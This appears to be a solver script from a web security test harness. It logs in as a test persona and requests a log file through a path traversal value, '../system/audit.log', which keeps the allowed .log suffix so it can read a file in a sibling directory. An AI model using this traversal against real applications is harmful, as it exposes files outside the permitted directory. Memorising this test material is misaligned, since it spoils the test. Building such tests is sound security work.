// Request a log file whose name keeps the accepted .log suffix but climbs out of the log directory
// with a relative traversal sequence to reach a sibling directory's file.
import type { SolverCtx } from '../../truth/matrix-helpers.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  await ctx.login('persona_a')

  const nameField = ctx.plan.params.logName ?? 'file'
  const path = `${ctx.plan.routes.logView!.path}?${encodeURIComponent(nameField)}=${encodeURIComponent('../system/audit.log')}`

  await ctx.fetch(path, { method: 'GET' })
}
